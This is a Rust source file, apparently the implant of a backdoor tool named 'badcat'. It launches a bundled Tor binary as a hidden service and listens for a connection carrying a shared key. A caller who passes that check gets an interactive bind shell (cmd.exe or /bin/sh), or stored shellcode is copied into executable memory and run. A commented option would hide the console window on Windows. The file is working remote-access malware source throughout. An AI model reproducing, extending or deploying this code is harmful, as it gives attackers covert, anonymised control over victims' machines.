// #![windows_subsystem = "windows"]

mod config;
mod setting;

use std::fs::File;
use std::net::{TcpListener, TcpStream};
use std::path::PathBuf;
use std::process::{Child, Command, Stdio};
use std::{error, mem, ptr, thread};
use std::io::{Read, Write};

use badcat_lib::io;
use memmap::MmapMut;

fn main() -> Result<(), Box<dyn error::Error>> {
    let setting = setting::Setting::new()?;

    start_tcp_server(&setting)?;

    Ok(())
}

fn unbundle_torrc(
    path: &PathBuf,
    port: u16,
    setting: &setting::Setting,
) -> Result<(), Box<dyn error::Error>> {
    let mut contents = setting.torrc.clone();

    contents = contents.replace("@{DATA_DIR}", setting.tor_dir.to_str().unwrap());

    contents = contents.replace(
        "@{CTRL_COOKIE}",
        setting.tor_dir.join("ctrl.cookie").to_str().unwrap(),
    );

    contents = contents.replace(
        "@{CTRL_SOCKET}",
        setting.tor_dir.join("ctrl.socket").to_str().unwrap(),
    );

    contents = contents.replace("@{SERVICE_ADDR}", &format!("127.0.0.1:{}", port));

    std::fs::write(&path, &contents)?;

    Ok(())
}

fn start_tor_binary(
    torrc: &PathBuf,
    setting: &setting::Setting,
) -> Result<Child, Box<dyn error::Error>> {
    let mut executable = setting.tor_dir.join(&setting.name);

    if cfg!(windows) {
        executable.set_extension("exe");
    }

    // Fix directory permission - linux build requires this
    if cfg!(unix) || cfg!(macos) {
        let status = Command::new("chmod")
            .args(["700", setting.tor_dir.to_str().unwrap()])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()?;

        if !status.success() {
            return Result::Err(String::from("problem setting app directory permision").into());
        }
    }

    let log = setting.tor_dir.join("log.txt");

    let stdout: File = File::create(&log)?;
    let stderr: File = File::create(&log)?;

    let proc = Command::new(executable)
        .args(["-f", torrc.to_str().unwrap()])
        .stdin(Stdio::null())
        .stdout(stdout)
        .stderr(stderr)
        .spawn()?;

    Ok(proc)
}

fn start_tcp_server(setting: &setting::Setting) -> Result<(), Box<dyn error::Error>> {
    let listener = TcpListener::bind("127.0.0.1:0")?;
    let port = listener.local_addr()?.port();
    println!("listening at: {:?}", port);

    let torrc = &setting.tor_dir.join("config");
    unbundle_torrc(&torrc, port, &setting)?;

    let mut tor_proc = start_tor_binary(&torrc, &setting)?;

    for stream in listener.incoming() {
        match stream {
            Ok(mut stream) => {
                if let Ok(()) = authenticate(&mut stream, &setting) {
                    if setting.uses_payload {
                        if let Ok(payload) = setting::get_payload(&setting) {
                            execute_payload(payload.data);
                        }
                    } else {
                        match bind_shell(stream) {
                            Ok(()) => {}
                            Err(error) => println!("connection error: {:?}", error),
                        };
                    }
                }
            }
            Err(error) => return Err(Box::new(error)),
        }
    }

    tor_proc.kill()?;

    Ok(())
}

fn authenticate(stream: &mut TcpStream, setting: &setting::Setting) -> Result<(), Box<dyn error::Error>> {
    let mut buf = Vec::new();
    
    // allocate a buffer size of key length
    for _ in 0..setting.key.len() {
        buf.push(0);
    }

    if let Err(err) = stream.read_exact(&mut buf) {
        return Err(err.into());
    }

    let untrusted_key = String::from_utf8_lossy(&buf);

    let equals = untrusted_key.eq(&setting.key);

    let reply = if equals {
        &[1]
    } else {
        &[0]
    };

    if let Err(err) = stream.write(reply) {
        return Err(err.into());
    }

    if let Err(err) = stream.flush() {
        return Err(err.into());
    }

    if equals {
        Ok(())
    } else {
        Err(String::from("not authenticated").into())
    }
}

fn bind_shell(stream: TcpStream) -> Result<(), Box<dyn error::Error>> {
    let mut args: Vec<&str> = Vec::new();

    let shell = if cfg!(windows) {
        "cmd.exe"
    } else {
        args.push("-i");
        "/bin/sh"
    };

    let proc = Command::new(shell)
        .args(args)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()?;

    let stdin = proc.stdin.unwrap();
    let stdout = proc.stdout.unwrap();
    let stderr = proc.stderr.unwrap();

    let stream_in = stream.try_clone()?;
    let stream_out = stream.try_clone()?;
    let stream_err = stream.try_clone()?;

    let in_thread = io::pipe_io(stream_in, stdin);
    let out_thread = io::pipe_io(stdout, stream_out);
    let err_thread = io::pipe_io(stderr, stream_err);

    in_thread.join().unwrap();
    out_thread.join().unwrap();
    err_thread.join().unwrap();

    Ok(())
}

fn execute_payload(payload: Vec<u8>) -> ! {
    // thread::spawn(move || {
    let len = payload.len();

    // writable memory
    let mut w_map = MmapMut::map_anon(len).unwrap();

    unsafe {
        // write shellcode
        ptr::copy(payload.as_ptr(), w_map.as_mut_ptr(), len);

        // transition to readable/executable memory
        let x_map = w_map.make_exec().unwrap();

        let code: extern "C" fn() -> ! = mem::transmute(x_map.as_ptr());
        code();
    };
    // });

    // Ok(())
}
